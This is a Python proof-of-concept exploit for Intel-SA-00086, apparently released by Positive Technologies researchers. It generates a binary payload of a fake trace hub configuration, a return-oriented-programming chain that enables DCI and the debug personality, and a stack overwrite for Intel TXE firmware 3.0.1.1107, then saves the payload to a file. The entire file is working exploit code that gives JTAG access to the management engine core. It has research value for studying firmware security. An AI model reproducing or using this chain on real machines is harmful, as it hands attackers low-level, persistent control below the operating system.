#!/usr/bin/env python
# JTAG activator for Intel ME core via Intel-SA-00086 by  Mark Ermolov (@_markel___)
#                                                         Maxim Goryachy (@h0t_max)
#
# Details:  https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00086.html
#           http://blog.ptsecurity.com/2018/01/running-unsigned-code-in-intel-me.html
#           https://github.com/ptresearch/IntelME-JTAG

from __future__ import print_function
import argparse
import struct

descr = "Intel-SA-00086 JTAG-PoC for TXE (ver. 3.0.1.1107)"
STACK_BASE = 0x00056000
SYSLIB_CTX_OFFSET = 0x10
STACK_OFFSET = 0x14
BUFFER_OFFSET = 0x380
SYS_TRACER_CTX_OFFSET = 0x200
SYS_TRACER_CTX_REQ_OFFSET = 0x55c58
RET_ADDR_OFFSET = 0x338


def GenerateTHConfig():
    print("[*] Generating fake tracehub configuration...")
    trace_hub_config   = struct.pack("<B", 0x0)*6
    trace_hub_config  += struct.pack("<H", 0x2)
    trace_hub_config  += struct.pack("<L", 0x020000e0)
    trace_hub_config  += struct.pack("<L", 0x5f000000)
    trace_hub_config  += struct.pack("<L", 0x02000010)
    trace_hub_config  += struct.pack("<L", 0x00000888)

    return trace_hub_config

def GenerateRops():
    print("[*] Generating rops...")
    #mapping DCI
    rops  = struct.pack("<L", 0x0004a76c) #side-band mapping 
    rops += struct.pack("<L", 0x0004a877) #pop 2 arguments
    rops += struct.pack("<L", 0x000706a8) #param 2
    rops += struct.pack("<L", 0x00000100) #param 1
    
    #activating DCI
    rops += struct.pack("<L", 0x000011BE) #put_sel_word
    rops += struct.pack("<L", 0x0004a876) #pop 3 arguments
    rops += struct.pack("<L", 0x0000019f) #param 3
    rops += struct.pack("<L", 0x00000000) #param 2
    rops += struct.pack("<L", 0x00001010) #param 1
    
    #activating DfX-agg
    rops += struct.pack("<L", 0x0004a76c) #side-band mapping 
    rops += struct.pack("<L", 0x0004a877) #pop 2 arguments
    rops += struct.pack("<L", 0x00070684) #param 2
    rops += struct.pack("<L", 0x00000100) #param 1
    
    #setting personality
    rops += struct.pack("<L", 0x000011BE) #put_sel_word
    rops += struct.pack("<L", 0x0004a876) #pop 3 arguments
    rops += struct.pack("<L", 0x0000019f) #param 3
    rops += struct.pack("<L", 0x00008400) #param 2
    rops += struct.pack("<L", 0x00000003) #param 1

    rops += struct.pack("<L", 0x0003d25b)
    rops += struct.pack("<L", 0x00055ff0)
    rops += struct.pack("<L", 0x00099010)
    rops += struct.pack("<L", 0x00000000)*4
    rops += struct.pack("<L", 0x00009dcc)
    rops += struct.pack("<L", 0x00000000)*3
    rops += struct.pack("<L", 0x0003d25d)
    rops += struct.pack("<L", 0x00000000)
    rops += struct.pack("<L", 0x00000001)
    rops += struct.pack("<L", 0x00050004)
    rops += struct.pack("<L", 0x00055d34)
    rops += struct.pack("<L", 0x00035674)
    rops += struct.pack("<L", 0x00000000)*4
    rops += struct.pack("<L", 0x00055d3c)
    rops += struct.pack("<L", 0x00035015)
    rops += struct.pack("<L", 0x00000000)
    rops += struct.pack("<L", 0x000260A1)

    return rops

def GenerateShellCode():
    syslib_ctx_start = SYS_TRACER_CTX_REQ_OFFSET - SYS_TRACER_CTX_OFFSET
    print("[*] Generating SYSLIB_CTX struct (stack base: %x: syslib ctx base: %x)..." % (STACK_BASE, syslib_ctx_start))
    data  = GenerateTHConfig()
    init_trace_len = len(data)
    data += GenerateRops()
    data += struct.pack("<B", 0x0)*(RET_ADDR_OFFSET - len(data))
    data += struct.pack("<L", 0x00016e1a) 
    data += struct.pack("<L", STACK_BASE - BUFFER_OFFSET + init_trace_len)

    data_tail = struct.pack("<LLLLL", 0, syslib_ctx_start,  0, 0x03000300, STACK_BASE-4)
    data += struct.pack("<B", 0x0)*(BUFFER_OFFSET - len(data) - len(data_tail))
    data += data_tail
    return data

def ParseArguments():
    parser = argparse.ArgumentParser(description=descr)
    parser.add_argument('-f', metavar='<file name>', help='file name', type=str, default="ct")
    return parser.parse_args().f

def main():
    print(descr)
    file_name = ParseArguments()
    data = GenerateShellCode()
    print("[*] Saving to %s..." % (file_name))
    f = open(file_name, "wb")
    f.write(data)
    f.close
    
if __name__=="__main__":
    main()
